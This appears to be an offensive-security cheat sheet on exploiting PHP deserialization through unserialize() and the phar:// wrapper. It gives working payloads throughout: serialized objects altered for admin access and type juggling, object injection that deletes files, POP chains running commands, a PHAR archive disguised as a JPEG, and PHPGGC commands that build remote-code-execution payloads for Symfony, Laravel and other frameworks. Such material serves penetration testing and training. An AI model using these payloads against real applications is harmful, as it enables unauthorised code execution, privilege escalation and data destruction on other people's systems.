# PHP Deserialization (unserialize / PHAR)

## When this applies

- Application calls `unserialize()` on user-controlled data (cookies, POST body, URL parameters).
- PHP file functions called with `phar://` wrapper on attacker-controlled paths.
- Goal: trigger magic methods (`__destruct`, `__wakeup`, `__toString`) on user-controlled classes for RCE / file write / file delete.

## Technique

Identify deserialized data via base64 prefix `Tzo`/`YTo`. Either modify the existing object's properties (privesc, type juggling) or inject a different class (POP gadget chain). For PHAR, build an archive with a JPEG-compatible stub and serialized metadata.

## Steps

### Detection

```bash
# Decode and inspect
echo "COOKIE_VALUE" | base64 -d | xxd | head

# Check magic bytes
echo "COOKIE_VALUE" | base64 -d | hexdump -C | head -n 1

# Search for patterns
echo "COOKIE_VALUE" | base64 -d | strings | grep -E "(O:|rO0|BAh)"
```

### PHP serialization format

```php
// Data types
b:1;                    // boolean true
b:0;                    // boolean false
i:42;                   // integer 42
d:3.14;                 // double/float 3.14
s:5:"hello";            // string "hello" (length 5)
a:2:{i:0;s:3:"foo";i:1;s:3:"bar";}  // array ["foo", "bar"]
N;                      // NULL

// Objects
O:4:"User":2:{          // Object of class "User" with 2 properties
  s:4:"name";           // Property "name"
  s:5:"admin";          // Value "admin"
  s:5:"admin";          // Property "admin"
  b:1;                  // Value true
}

// Private properties (includes null bytes)
O:4:"Test":1:{
  s:10:"\x00Test\x00foo";  // Private property "foo" in class "Test"
  s:3:"bar";
}
```

### Magic methods (entry points)

| Method | When Called | Exploitation Potential |
|--------|-------------|------------------------|
| `__destruct()` | Object destruction | High - Always called |
| `__wakeup()` | After unserialize() | High - Called immediately |
| `__toString()` | Object used as string | Medium - Requires output |
| `__call()` | Call to undefined method | Medium |
| `__get()` | Access undefined property | High - Common in gadget chains |
| `__invoke()` | Object called as function | Medium |

### Common exploits

**Basic Privilege Escalation:**
```php
// Original
O:4:"User":2:{s:8:"username";s:6:"victim";s:5:"admin";b:0;}

// Exploited (change b:0 to b:1)
O:4:"User":2:{s:8:"username";s:6:"victim";s:5:"admin";b:1;}
```

**Type Juggling (Loose Comparison):**
```php
// Exploit PHP's == operator
// Change string to integer 0
s:32:"abc123..." → i:0

// Result: 0 == "any_string" evaluates to true
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```

**Arbitrary Object Injection:**
```php
// Inject malicious class
O:14:"CustomTemplate":1:{
  s:14:"lock_file_path";
  s:15:"/tmp/target.txt";
}

// When __destruct() is called:
// unlink($this->lock_file_path);  → deletes file
```

**Property-Oriented Programming (POP) Chain:**
```php
O:5:"Start":1:{
  s:4:"next";
  O:6:"Middle":1:{
    s:4:"data";
    O:3:"End":1:{
      s:7:"command";
      s:6:"whoami";
    }
  }
}
```

### PHAR deserialization (file function trigger)

Any PHP file function with a `phar://` wrapper deserializes the PHAR manifest:

```php
file_exists('phar://upload/evil.jpg');
file_get_contents('phar://upload/evil.jpg');
// Also: is_file, file, fopen, stat, etc.
```

**PHAR creation with JPEG magic byte bypass:**
```php
$phar = new Phar('evil.phar');
$phar->startBuffering();
$phar->addFromString('x.txt','x');
$phar->setStub("\xff\xd8\xff<?php __HALT_COMPILER(); ?>"); // JPEG header
$phar->setMetadata(new VulnerableClass());
$phar->stopBuffering();
rename('evil.phar','evil.jpg'); // passes getimagesize() check
```

### Reference-based collision (R: notation)

```
O:13:"ObjectExample":2:{s:10:"secretCode";N;s:5:"guess";R:2;}
# R:2 makes "guess" point to same memory as "secretCode" → always equal
```

### PHPGGC

```bash
# List all gadget chains
./phpggc -l

# List for specific framework
./phpggc -l symfony
./phpggc -l laravel
./phpggc -l monolog

# Get information about a chain
./phpggc -i Symfony/RCE4

# Generate payload
./phpggc Symfony/RCE4 exec 'rm /tmp/file'

# Generate with encoding
./phpggc Symfony/RCE4 exec 'whoami' -b   # Base64
./phpggc Symfony/RCE4 exec 'whoami' -u   # URL-encode
./phpggc Symfony/RCE4 exec 'whoami' -j   # JSON

# Test payload
./phpggc Symfony/RCE4 exec 'whoami' --test-payload

# Fast destruct (immediate execution)
./phpggc Symfony/RCE4 exec 'whoami' -f

# Generate PHAR file
./phpggc Symfony/RCE4 exec 'whoami' -p phar -o exploit.phar
```

### PHP framework-specific chains

| Framework | PHPGGC Gadget | Notes |
|-----------|---------------|-------|
| Symfony 2.x-5.x | `Symfony/RCE4` | Uses ChainedTransformer |
| Symfony 3.4+ | `Symfony/RCE7` | Alternative chain |
| Laravel 5.4-5.8 | `Laravel/RCE1` | Uses __destruct() |
| Laravel 5.8+ | `Laravel/RCE9` | Updated chain |
| Monolog 1.x-2.x | `Monolog/RCE1` | File write + include |
| Guzzle 6.x | `Guzzle/RCE1` | HTTP request gadget |
| SwiftMailer 5.x-6.x | `SwiftMailer/FW1` | File write |
| Doctrine | `Doctrine/FW1` | File write chain |

### Dangerous PHP functions to look for in gadgets

```php
// Command execution
exec, system, passthru, shell_exec, popen, proc_open, backticks

// Code execution
eval, assert (PHP 5.x), create_function (PHP 5.x), preg_replace /e

// File operations
unlink, file_get_contents, file_put_contents, include, require, fopen

// Reflection
call_user_func, ReflectionClass::newInstance
```

## Verifying success

- Modified b:0 → b:1 results in admin access on next request.
- POP chain triggers RCE — out-of-band callback received.
- PHAR `file_exists('phar://...')` triggers `__destruct` — observable side effect.

## Common pitfalls

- `unserialize($data, ['allowed_classes' => [...]])` blocks unknown classes — POP chains fail unless allowlist includes a vulnerable class.
- PHAR deserialization is patched in PHP 8.0+ — wrappers are stricter.
- Base64-padding mistakes break the payload — use phpggc's `-b` carefully.

## Tools

- PHPGGC (gadget chain generator)
- Burp Suite Repeater
- Custom PHP scripts (test deserialization locally)
